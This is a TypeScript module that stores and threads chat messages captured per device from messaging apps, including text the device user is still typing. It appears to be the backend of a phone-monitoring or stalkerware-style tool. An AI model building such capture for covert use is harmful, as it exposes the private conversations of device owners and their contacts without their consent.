import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { dataPath } from "./dataPath.js";

export type ChatDirection = "me" | "them" | "unknown";
export type ChatStatus = "typing" | "sent" | "received" | "unknown";

export interface ChatIntelMessage {
  id: string;
  deviceId: string;
  app: string;
  pkg: string;
  partner: string;
  direction: ChatDirection;
  text: string;
  ts: number;
  status: ChatStatus;
}

const MAX_MESSAGES = 20_000;

function messagesDir(): string {
  return dataPath("chat-intel");
}

function readMessages(deviceId: string): ChatIntelMessage[] {
  const path = join(messagesDir(), `${deviceId}.json`);
  if (!existsSync(path)) return [];
  try {
    const data = JSON.parse(readFileSync(path, "utf8")) as { messages?: ChatIntelMessage[] };
    return data.messages ?? [];
  } catch {
    return [];
  }
}

function writeMessages(deviceId: string, messages: ChatIntelMessage[]) {
  const dir = messagesDir();
  if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
  while (messages.length > MAX_MESSAGES) messages.shift();
  writeFileSync(join(dir, `${deviceId}.json`), JSON.stringify({ messages }, null, 2) + "\n", "utf8");
}

function normalizeDirection(raw: string): ChatDirection {
  if (raw === "me" || raw === "them") return raw;
  return "unknown";
}

function normalizeStatus(raw: string, direction: ChatDirection): ChatStatus {
  if (raw === "typing" || raw === "sent" || raw === "received") return raw;
  if (direction === "me") return "sent";
  if (direction === "them") return "received";
  return "unknown";
}

export function appendChatIntel(
  deviceId: string,
  items: {
    id: string;
    app?: string;
    pkg?: string;
    partner?: string;
    direction?: string;
    text?: string;
    at?: number;
    status?: string;
  }[],
) {
  if (!items.length) return;
  const existing = readMessages(deviceId);
  const byId = new Map(existing.map((m) => [m.id, m]));

  for (const raw of items) {
    if (!raw.id) continue;
    const text = String(raw.text ?? "").trim();
    if (!text) continue;
    const ts = Number(raw.at ?? Date.now());
    const direction = normalizeDirection(String(raw.direction ?? "unknown"));
    const msg: ChatIntelMessage = {
      id: raw.id,
      deviceId,
      app: String(raw.app ?? ""),
      pkg: String(raw.pkg ?? ""),
      partner: String(raw.partner ?? "Chat").trim() || "Chat",
      direction,
      text: text.slice(0, 500),
      ts,
      status: normalizeStatus(String(raw.status ?? ""), direction),
    };
    byId.set(msg.id, msg);
  }

  const merged = [...byId.values()].sort((a, b) => b.ts - a.ts);
  writeMessages(deviceId, merged);
}

export function getChatIntel(deviceId: string, from?: number, to?: number): ChatIntelMessage[] {
  let rows = readMessages(deviceId);
  if (from != null) rows = rows.filter((r) => r.ts >= from);
  if (to != null) rows = rows.filter((r) => r.ts <= to);
  return rows.sort((a, b) => b.ts - a.ts);
}

export function getChatIntelCount(deviceId: string): number {
  return readMessages(deviceId).length;
}

export interface ChatConversationThread {
  key: string;
  app: string;
  pkg: string;
  partner: string;
  count: number;
  theirCount: number;
  myCount: number;
  firstTs: number;
  lastTs: number;
  preview: string;
  theirPreview: string;
  myPreview: string;
  messages: {
    id: string;
    ts: number;
    direction: ChatDirection;
    text: string;
    status: ChatStatus;
    speakerLabel: string;
  }[];
}

export function buildChatConversationThreads(messages: ChatIntelMessage[]): ChatConversationThread[] {
  const map = new Map<string, ChatIntelMessage[]>();
  for (const m of messages) {
    const key = `${m.pkg}|${m.partner}`;
    const list = map.get(key) ?? [];
    list.push(m);
    map.set(key, list);
  }

  const threads: ChatConversationThread[] = [];
  for (const [key, rows] of map) {
    const sorted = [...rows].sort((a, b) => a.ts - b.ts);
    const [pkg, partner] = key.split("|");
    const their = sorted.filter((m) => m.direction === "them");
    const mine = sorted.filter((m) => m.direction === "me" && m.status !== "typing");
    const typing = sorted.filter((m) => m.status === "typing");
    const last = sorted[sorted.length - 1];
    const theirLast = their[their.length - 1];
    const myLast = mine[mine.length - 1] ?? typing[typing.length - 1];

    threads.push({
      key,
      app: last?.app || pkg,
      pkg,
      partner,
      count: sorted.length,
      theirCount: their.length,
      myCount: mine.length + typing.length,
      firstTs: sorted[0]?.ts ?? 0,
      lastTs: last?.ts ?? 0,
      preview: last?.text ?? "",
      theirPreview: theirLast?.text ?? "",
      myPreview: myLast?.text ?? "",
      messages: sorted.slice(-40).map((m) => ({
        id: m.id,
        ts: m.ts,
        direction: m.direction,
        text: m.text,
        status: m.status,
        speakerLabel:
          m.status === "typing"
            ? "User typing…"
            : m.direction === "me"
              ? "User"
              : m.direction === "them"
                ? partner
                : "Unknown",
      })),
    });
  }

  return threads.sort((a, b) => b.lastTs - a.lastTs).slice(0, 50);
}
